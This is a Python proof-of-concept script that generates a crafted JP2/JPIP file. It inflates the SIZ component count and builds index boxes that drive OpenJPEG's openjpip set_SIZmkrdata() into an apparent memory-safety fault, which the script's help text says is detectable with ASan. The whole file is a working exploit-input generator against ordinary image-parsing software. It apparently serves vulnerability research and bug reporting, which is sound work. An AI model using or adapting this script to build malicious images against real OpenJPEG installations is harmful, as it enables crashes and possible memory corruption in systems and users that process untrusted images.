#!/usr/bin/env python3
import argparse
import struct
from pathlib import Path


def be16(x: int) -> bytes:
    return struct.pack('>H', x)


def be32(x: int) -> bytes:
    return struct.pack('>I', x)


def be64(x: int) -> bytes:
    return struct.pack('>Q', x)


def u16(buf: bytes, off: int) -> int:
    return struct.unpack_from('>H', buf, off)[0]


def u32(buf: bytes, off: int) -> int:
    return struct.unpack_from('>I', buf, off)[0]


def box(typ: bytes, payload: bytes) -> bytes:
    assert len(typ) == 4
    return be32(8 + len(payload)) + typ + payload


SIG_BOX = be32(12) + b'jP  ' + b'\r\n\x87\n'


def parse_main_header_len(cs: bytes) -> int:
    if cs[:2] != b'\xff\x4f':
        raise ValueError('codestream does not start with SOC')
    pos = 2
    while pos + 2 <= len(cs):
        code = u16(cs, pos)
        if code == 0xFF90:  # SOT
            return pos
        # Delimiting markers without segment body. Not expected here before SOT,
        # but keep the parser from looping forever.
        if code in (0xFF4F, 0xFF93, 0xFFD9, 0xFF92):
            pos += 2
            continue
        if pos + 4 > len(cs):
            raise ValueError('truncated marker segment while scanning main header')
        seglen = u16(cs, pos + 2)
        pos += 2 + seglen
    return len(cs)


def build_patched_codestream(raw: bytes, new_csiz: int) -> tuple[bytes, dict]:
    if raw[:2] != b'\xff\x4f':
        raise ValueError('input is not a raw J2K codestream (missing SOC)')
    if raw[2:4] != b'\xff\x51':
        raise ValueError('expected SIZ marker immediately after SOC')

    siz_data_off = 4  # after SOC(2) + SIZ marker code(2)
    old_lsiz = u16(raw, siz_data_off)
    old_siz_data = raw[siz_data_off:siz_data_off + old_lsiz]
    old_csiz = u16(old_siz_data, 36)
    if old_csiz <= 0:
        raise ValueError('invalid original Csiz')

    comp_bytes = old_siz_data[38:38 + 3 * old_csiz]
    if len(comp_bytes) != 3 * old_csiz:
        raise ValueError('truncated original component triplets in SIZ')

    new_lsiz = 38 + 3 * new_csiz
    new_siz = bytearray(new_lsiz)
    new_siz[:38] = old_siz_data[:38]
    struct.pack_into('>H', new_siz, 0, new_lsiz)
    struct.pack_into('>H', new_siz, 36, new_csiz)
    for i in range(new_csiz):
        triplet = comp_bytes[(i % old_csiz) * 3:(i % old_csiz) * 3 + 3]
        new_siz[38 + 3 * i:38 + 3 * i + 3] = triplet

    old_cod_code_off = siz_data_off + old_lsiz
    if raw[old_cod_code_off:old_cod_code_off + 2] != b'\xff\x52':
        raise ValueError('expected COD marker right after SIZ in input codestream')
    old_cod_data_off = old_cod_code_off + 2
    old_lcod = u16(raw, old_cod_data_off)

    delta = new_lsiz - old_lsiz
    new_raw = raw[:siz_data_off] + bytes(new_siz) + raw[siz_data_off + old_lsiz:]
    new_cod_code_off = old_cod_code_off + delta
    new_cod_data_off = old_cod_data_off + delta
    if new_raw[new_cod_code_off:new_cod_code_off + 2] != b'\xff\x52':
        raise ValueError('COD marker no longer where expected after patching SIZ')

    main_header_len = parse_main_header_len(new_raw)

    info = {
        'siz_data_off': siz_data_off,
        'siz_length': new_lsiz,
        'cod_data_off': new_cod_data_off,
        'cod_length': old_lcod,
        'main_header_len': main_header_len,
        'old_csiz': old_csiz,
        'new_csiz': new_csiz,
        'new_codestream_len': len(new_raw),
    }
    return new_raw, info


def build_minimal_jp2_with_jpip(cs: bytes, info: dict, include_manifest_headers: bool) -> bytes:
    # Pre-build cidx children whose sizes do not depend on absolute offsets.
    cptr_placeholder = box(b'cptr', b'\x00' * 20)

    manf_payload = [be32(44) + b'mhix']
    if include_manifest_headers:
        manf_payload += [be32(8) + b'tpix', be32(8) + b'thix', be32(8) + b'ppix']
    manf = box(b'manf', b''.join(manf_payload))

    mhix_payload = (
        be64(info['main_header_len']) +
        be16(0xFF51) + be16(0) + be64(info['siz_data_off']) + be16(info['siz_length']) +
        be16(0xFF52) + be16(0) + be64(info['cod_data_off']) + be16(info['cod_length'])
    )
    mhix = box(b'mhix', mhix_payload)

    cidx_len = 8 + len(cptr_placeholder) + len(manf) + len(mhix)
    jp2c_len = 8 + len(cs)
    prxy_len = 8 + 8 + 8 + 1 + 8 + 8
    fidx_len = 8 + prxy_len
    iptr_len = 24

    sig_off = 0
    iptr_off = sig_off + len(SIG_BOX)
    fidx_off = iptr_off + iptr_len
    cidx_off = fidx_off + fidx_len
    jp2c_off = cidx_off + cidx_len

    iptr = box(b'iptr', be64(fidx_off) + be64(fidx_len))
    prxy = box(
        b'prxy',
        be64(jp2c_off) +
        be32(jp2c_len) + b'jp2c' +
        b'\x01' +
        be64(cidx_off) +
        be32(cidx_len) + b'cidx'
    )
    fidx = box(b'fidx', prxy)
    cptr = box(b'cptr', be16(0) + be16(0) + be64(jp2c_off + 8) + be64(len(cs)))
    cidx = box(b'cidx', cptr + manf + mhix)
    jp2c = box(b'jp2c', cs)

    out = SIG_BOX + iptr + fidx + cidx + jp2c
    return out


def main() -> None:
    ap = argparse.ArgumentParser(description='Build a minimal JP2/JPIP-like file that reaches openjpip set_SIZmkrdata() from opj_jpip_test.')
    ap.add_argument('input_j2k', help='raw codestream generated by opj_compress, e.g. rgba16x16.j2k')
    ap.add_argument('output_jp2', help='output file to feed to opj_jpip_test')
    ap.add_argument('--csiz', type=int, default=64, help='patched Csiz value to store in SIZ (default: 64). 4 is the clean intra-object case; larger values are more likely to trip ASan on x86.')
    ap.add_argument('--include-manifest-headers', action='store_true', help='also list tpix/thix/ppix headers in the manifest, even though this PoC is meant to abort earlier in set_SIZmkrdata().')
    args = ap.parse_args()

    raw = Path(args.input_j2k).read_bytes()
    patched_cs, info = build_patched_codestream(raw, args.csiz)
    out = build_minimal_jp2_with_jpip(patched_cs, info, args.include_manifest_headers)
    Path(args.output_jp2).write_bytes(out)

    print(f'[+] wrote {args.output_jp2}')
    print(f'    original Csiz   : {info["old_csiz"]}')
    print(f'    patched Csiz    : {info["new_csiz"]}')
    print(f'    SIZ data offset : {info["siz_data_off"]}')
    print(f'    SIZ length      : {info["siz_length"]}')
    print(f'    COD data offset : {info["cod_data_off"]}')
    print(f'    COD length      : {info["cod_length"]}')
    print(f'    codestream size : {info["new_codestream_len"]}')
    print('[*] Feed this file to opj_jpip_test. It is parser-oriented, not a standards-complete JP2/JPIP file.')


if __name__ == '__main__':
    main()
